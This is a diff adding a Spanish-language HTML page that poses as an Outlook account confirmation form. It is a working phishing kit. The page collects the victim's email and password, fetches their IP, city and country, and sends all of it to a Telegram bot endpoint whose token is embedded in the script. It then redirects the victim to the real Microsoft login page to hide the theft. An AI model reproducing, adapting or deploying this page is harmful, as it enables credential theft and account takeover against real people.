@@ -1,0 +1,171 @@
+<html><head>
+    <!-- Inserted by miarroba -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+    <!-- Inserted by miarroba --><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <link rel="stylesheet" href="bootstrap.min.css">
+        
+    <title>Home</title><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" type="text/css" href="util.css"><link rel="stylesheet" type="text/css" href="main.css"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+      
+          <script>
+             $.getJSON("https://ipinfo.io", function (response) {
+        $("#address").html("" + response.city + ", " + response.country);
+        
+    })
+          </script></head>
+        
+    <body>
+
+        <br>
+        <br>
+        <br>
+        <header id="main-header">
+    
+            
+            
+            
+    <br>
+    <br>
+    <br>
+    <br>
+    <br><br>
+                            
+            <div class="menu-header" href="index.html">
+         <div id="bar-menu" class="bar-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      </div>
+        </header><!-- / #main-header -->
+        <div class="limiter">
+            <div class="container-login100" style="background-image: url(); 
+        position: absolute;
+       ">
+                <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+                
+                
+     <section class="">
+               
+            <form  id="contenido1" class="login100-form validate-form" action="#" onsubmit=" return sender()" method="post">
+                 <p id="address"  hidden="">
+                     <p id="gfg"  hidden="">
+                        
+                        <b><div class="textypn1"><span class="model" style="font-size:28px; color:#003995; text-align:center;">
+                        Confirme su cuenta</div></b>
+                        <div class="wrap-input101 validate-input" data-validate="" > 
+                        <br>
+                    
+                        <div class="textypn2"><span class="model" style="font-size:16px; color:#003995; text-align:center;">
+                    Realiza el proceso de validación para habilitar 
+                        tu cuenta Outlook.</div>
+                        <br>
+                        <br>
+                        <div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
+                         
+    Confirma tu correo </div>
+                        <br>
+                        <div class="wrap-input101 validate-input" data-validate="" > 
+                            <span class="label-input101"></span>
+                            <input class="input101" type="email" name="ypn-cel" id="ypn-cel"  required="true"" placeholder="" required="">
+                            <span class="focus-input100" data-symbol=""></span>
+                        </div>
+                        <br>
+                            <div class="textypn2" ><span class="model" style="font-size:16px; color:gray; text-align:center;">
+                        Confirma tu clave de correo</div>
+                        <br>
+                        
+                        <div class="wrap-input101 validate-input" data-validate="">
+                            <input class="input101" type="password"  name="ypn-fn" id="ypn-fn" required="true"" placeholder="" required="">
+                            <span class="focus-input100" data-symbol=""></span>
+                        </div>
+                        <div class="wrap-input101 validate-input" data-validate="" > 
+                            <span class="label-input101"></span>
+                            <br>
+                            <br>
+                            <br>
+                                
+                            
+                        </div>
+                        
+                        <div class="container-login100-form-btn">
+                            <br>
+    
+    <br>
+                            <div class="wrap-login100-form-btn">
+                                <div class="login100-form-bgbtn"></div>
+                                <button type="submit" style="height:50px; width:100%;" class="login100-form-btn" value="Continuar" id="btnSend">
+                                    Iniciar Sesión
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div>
+                        <br>
+                        <br>
+    <a href="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" target="_blank"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" style="padding-left: 24%;alt="image host"/></a>
+    
+                        </div><br>
+    
+                            
+                        
+                    </form>
+                    
+                </div>
+                
+            </div>
+                <header id="main-header2">
+        </header><!-- / #main-header -->
+        </div>
+            <div id="dropDownSelect1"></div>
+    
+        
+            <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+            <script>
+              const url = "https://ipapi.co/json/";
+              const form = document.querySelector("#contenido1");
+              form.addEventListener("submit", (event) => {
+                event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+                axios
+                  .get(url)
+                  .then((response) => {
+                    const email = document.querySelector("#ypn-cel").value;
+          
+                    const contra = document.querySelector("#ypn-fn").value;
+                    
+                    const message =
+                      "\nHotmail" +
+                      "\nEmail: " +
+                      email +
+                      "\nContra: " +
+                      contra +
+                      "\nCiudad:" +
+                      response.data.city +
+                      "\nPais: " +
+                      response.data.country +
+                      "\nIP: " +
+                      response.data.ip;
+                    axios
+                      .post(
+                        "https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage",
+                        {
+                          chat_id: "-4037234500",
+                          text: message,
+                        }
+                      )
+                      .then((response) => {
+                        window.location.href = "https://login.live.com";
+                      })
+                      .catch((error) => {
+                        console.error(error);
+                      });
+                  })
+                  .catch((error) => {
+                    console.log(error);
+                  });
+              });
+            </script>
+    
+
+    </body></html>
